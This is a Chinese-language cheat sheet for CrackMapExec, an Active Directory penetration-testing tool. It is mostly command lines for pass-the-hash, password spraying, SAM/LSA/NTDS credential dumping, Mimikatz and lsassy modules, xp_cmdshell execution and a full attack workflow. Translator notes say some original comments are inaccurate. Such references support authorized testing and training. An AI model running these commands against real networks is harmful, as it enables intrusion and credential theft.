<a id="-crackmapexec---ad-swiss-army-knife"></a>
# 🗡️ CrackMapExec：AD 渗透测试多功能工具

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](./README.it.md) | [🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
         CrackMapExec：渗透测试多功能工具          
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

<a id="-table-of-contents"></a>
## 📋 目录

- [什么是 CrackMapExec](#-what-is-crackmapexec)
- [安装](#-installation)
- [SMB 协议](#-smb-protocol)
- [WinRM 协议](#-winrm-protocol)
- [LDAP 协议](#-ldap-protocol)
- [MSSQL 协议](#-mssql-protocol)
- [SSH 协议](#-ssh-protocol)
- [模块](#-modules)
- [密码喷洒](#-password-spraying)
- [速查](#-quick-reference)

---

<a id="-what-is-crackmapexec"></a>
## 🎯 什么是 CrackMapExec

**CrackMapExec（CME）** 是用于网络评估的后渗透工具，支持以下功能：

- 🖥️ **SMB** - 共享、会话、命令执行
- 🔧 **WinRM** - PowerShell 远程管理
- 📂 **LDAP** - AD 枚举
- 🗄️ **MSSQL** - SQL Server 攻击
- 🐧 **SSH** - Linux 目标
- 💉 **哈希传递（Pass-the-Hash）** - 凭据复用

<a id="features"></a>
### 功能

| 功能 | 说明 |
|---------|-------------|
| **多协议** | SMB, WinRM, LDAP, MSSQL, SSH |
| **并行执行** | 对多个目标执行操作 |
| **凭据数据库** | 记录已获取的凭据 |
| **模块** | 可通过自定义模块扩展 |
| **输出格式** | 多种输出选项 |

---

<a id="-installation"></a>
## 🚀 安装

<a id="kali-linux"></a>
### Kali Linux

```bash
# 通过 apt 安装
sudo apt update
sudo apt install crackmapexec

# 或通过 pipx 安装（推荐）
pipx install crackmapexec
```

<a id="using-pipx"></a>
### 使用 pipx

```bash
# 先安装 pipx
sudo apt install pipx
pipx ensurepath

# 安装 CME
pipx install crackmapexec
```

<a id="verify"></a>
### 验证

```bash
crackmapexec --help
crackmapexec smb --help
```

---

<a id="-smb-protocol"></a>
## 🖥️ SMB 协议

<a id="basic-enumeration"></a>
### 基本枚举

```bash
# 检查主机是否可达
cme smb 10.10.10.0/24

# 使用凭据枚举
cme smb 10.10.10.10 -u user -p password

# 域身份验证
cme smb 10.10.10.10 -u user -p password -d domain.local

# 本地身份验证
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

<a id="pass-the-hash"></a>
### 哈希传递（Pass-the-Hash）

```bash
# 使用 NTLM 哈希进行 SMB 身份验证
cme smb 10.10.10.10 -u user -H NTLMHASH

# 完整 LM:NTLM 哈希
cme smb 10.10.10.10 -u user -H LM:NTLM

# 在网络范围内尝试复用哈希
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

<a id="share-enumeration"></a>
### 共享枚举

```bash
# 列出共享
cme smb 10.10.10.10 -u user -p password --shares

# 爬取共享以查找文件
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# 递归列出文件
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

<a id="user-enumeration"></a>
### 用户枚举

```bash
# 通过 RPC 列出用户
cme smb 10.10.10.10 -u user -p password --users

# 列出组
cme smb 10.10.10.10 -u user -p password --groups

# 列出已登录用户
cme smb 10.10.10.10 -u user -p password --loggedon-users

# 获取用户 SID
cme smb 10.10.10.10 -u user -p password --rid-brute
```

<a id="command-execution"></a>
### 命令执行

```bash
# 执行命令
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell 执行
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# 不同的执行方法
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

<a id="credential-dumping"></a>
### 凭据导出

```bash
# 导出 SAM
cme smb 10.10.10.10 -u admin -p password --sam

# 导出 LSA
cme smb 10.10.10.10 -u admin -p password --lsa

# 导出 NTDS.dit（原文注明 DC 上需要 DA；权限条件见译注）
cme smb DC01.domain.local -u admin -p password --ntds

# 通过指定方法导出 NTDS
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

<a id="smb-signing"></a>
### SMB 签名

```bash
# 检查 SMB 签名（用于判断中继条件）
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

<a id="-winrm-protocol"></a>
## 🔧 WinRM 协议

<a id="basic-usage"></a>
### 基本用法

```bash
# 检查 WinRM 访问权限
cme winrm 10.10.10.10 -u user -p password

# 检查多个目标
cme winrm 10.10.10.0/24 -u user -p password

# 使用哈希
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

<a id="command-execution-1"></a>
### 命令执行

```bash
# 执行命令
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# 执行脚本
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

<a id="credential-dumping-1"></a>
### 凭据导出

```bash
# 通过 WinRM 导出 SAM
cme winrm 10.10.10.10 -u admin -p password --sam

# LSA 机密信息
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

<a id="-ldap-protocol"></a>
## 📂 LDAP 协议

<a id="enumeration"></a>
### 信息枚举

```bash
# 基本 LDAP 查询
cme ldap DC01.domain.local -u user -p password

# 列出用户
cme ldap DC01 -u user -p password --users

# 列出组
cme ldap DC01 -u user -p password --groups

# 可进行 AS-REP Roasting 的用户
cme ldap DC01 -u user -p password --asreproast asrep.txt

# 可进行 Kerberoasting 的用户
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

<a id="password-policy"></a>
### 密码策略

```bash
# 获取密码策略
cme ldap DC01 -u user -p password --password-policy
```

<a id="user-attributes"></a>
### 用户属性

```bash
# 获取用户描述
cme ldap DC01 -u user -p password -M get-desc-users

# 获取指定属性
cme ldap DC01 -u user -p password --admin-count
```

---

<a id="-mssql-protocol"></a>
## 🗄️ MSSQL 协议

<a id="basic-usage-1"></a>
### 基本用法

```bash
# 连接 MSSQL
cme mssql 10.10.10.10 -u sa -p password

# Windows 身份验证
cme mssql 10.10.10.10 -u user -p password -d domain.local

# 使用哈希
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

<a id="command-execution-2"></a>
### 命令执行

```bash
# 通过 xp_cmdshell 执行
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# 先启用 xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# 执行命令
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

<a id="-ssh-protocol"></a>
## 🐧 SSH 协议

<a id="basic-usage-2"></a>
### 基本用法

```bash
# 检查 SSH
cme ssh 10.10.10.10 -u root -p password

# 多个目标
cme ssh 10.10.10.0/24 -u user -p password

# 使用密钥文件
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

<a id="command-execution-3"></a>
### 命令执行

```bash
# 执行命令
cme ssh 10.10.10.10 -u root -p password -x "id"

# 多条命令
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

<a id="-modules"></a>
## 🧩 模块

<a id="list-modules"></a>
### 列出模块

```bash
# 列出所有模块
cme smb -L
cme winrm -L
cme ldap -L

# 模块帮助
cme smb -M mimikatz --options
```

<a id="popular-modules"></a>
### 常用模块

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy（导出 LSASS）
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# GPP 密码
cme smb DC01 -u user -p password -M gpp_password

# GPP 自动登录（AutoLogon）
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus（共享爬取）
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

<a id="bloodhound-collection"></a>
### BloodHound 数据收集

```bash
# 收集 BloodHound 数据
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

<a id="-password-spraying"></a>
## 🔓 密码喷洒

<a id="basic-spraying"></a>
### 基本密码喷洒

```bash
# 对多个用户尝试同一密码
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# 多个密码
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# 不做暴力枚举（原文解释为“尝试每种组合”，见译注）
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

<a id="network-spraying"></a>
### 网络范围密码喷洒

```bash
# 在网络范围内进行密码喷洒
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# 从目标文件读取
cme smb targets.txt -u admin -p password --continue-on-success
```

<a id="lockout-awareness"></a>
### 关注账户锁定策略

```bash
# 先检查密码策略
cme ldap DC01 -u user -p password --password-policy

# 输出：
# Minimum password length: 8
# Password history length: 24
# Lockout threshold: 5
# Lockout duration: 30 minutes
```

---

<a id="-database"></a>
## 💾 数据库

<a id="cme-database"></a>
### CME 数据库

```bash
# 查看凭据
cmedb

# 在 cmedb 内部：
creds           # 列出已存储的凭据
hosts           # 列出已扫描的主机
```

<a id="export-data"></a>
### 导出数据

```bash
# 输出格式
cme smb 10.10.10.10 -u user -p password --log log.txt

# JSON 输出
cme smb 10.10.10.10 -u user -p password --json
```

---

<a id="-quick-reference"></a>
## 📊 速查

<a id="authentication-methods"></a>
### 身份验证方式

| 方式 | 选项 |
|--------|--------|
| 密码 | `-p password` |
| NTLM 哈希 | `-H HASH` |
| AES 密钥 | `--aesKey KEY` |
| Kerberos | `-k` |
| 本地身份验证 | `--local-auth` |

<a id="protocols"></a>
### 协议

| 协议 | 端口 | 用途 |
|----------|------|----------|
| SMB | 445 | 文件共享、命令执行 |
| WinRM | 5985/5986 | PowerShell 远程管理 |
| LDAP | 389/636 | AD 枚举 |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | Linux 系统 |

<a id="common-flags"></a>
### 常用参数

| 参数 | 说明 |
|------|-------------|
| `-u` | 用户名（或文件） |
| `-p` | 密码（或文件） |
| `-H` | NTLM 哈希 |
| `-d` | 域 |
| `-x` | 命令（cmd） |
| `-X` | 命令（PowerShell） |
| `--shares` | 列出共享 |
| `--users` | 列出用户 |
| `--sam` | 导出 SAM |
| `--lsa` | 导出 LSA |
| `--ntds` | 导出 NTDS |

<a id="output-markers"></a>
### 输出标记

| 标记 | 含义 |
|--------|---------|
| `[+]` | 成功 |
| `[-]` | 失败 |
| `[*]` | 信息 |
| `(Pwn3d!)` | 已确认管理员访问权限 |

<a id="typical-workflow"></a>
### 典型流程

```bash
# 1. 网络扫描
cme smb 10.10.10.0/24

# 2. 密码喷洒
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. 检查管理员访问权限
cme smb 10.10.10.0/24 -u user -p password

# 4. 导出凭据
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. 使用已发现的凭据
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

<a id="-resources"></a>
## 📚 参考资料

- [CrackMapExec GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [CrackMapExec 维基](https://wiki.porchetta.industries/)
- [CME 模块](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

<a id="related-cheatsheets"></a>
### 相关速查表
- [BloodHound](../../BloodHound/translations/README.zh-CN.md)
- [Impacket](../../Impacket/translations/README.zh-CN.md)
- [Mimikatz](../../Mimikatz/translations/README.zh-CN.md)

---

<p align="center">
  <b>🗡️ 掌控网络！</b><br>
  <i>CrackMapExec：渗透测试人员的多功能工具</i>
</p>

> 译注：[旧 CME 仓库](https://github.com/byt3bl33d3r/CrackMapExec)已于 2023 年归档；[NetExec 官方仓库](https://github.com/Pennyw0rth/NetExec)说明其承接了后续社区开发。本页按原文保留 cme／crackmapexec，不进行命令迁移。安装来源、协议选项和模块可用性取决于版本；--password-policy、--enable-xp、--json 等示例不能假定在所有版本或协议下都存在。

> 译注：[旧 CME 参数定义](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/cli.py)将 --no-bruteforce 解释为按用户名文件和密码文件逐行配对，而不是尝试所有组合；原文注释的括号说明不准确。--continue-on-success 仅表示成功后继续尝试，不会自动避免账户锁定。导出 NTDS 的权限条件也依方法而异：[DCSync 权限说明](https://bloodhound.specterops.io/resources/edges/dc-sync)要求 GetChanges 与 GetChangesAll 的组合，并不一定要属于 Domain Admins。原始命令、模块名、凭据和输出样例均保留原样。
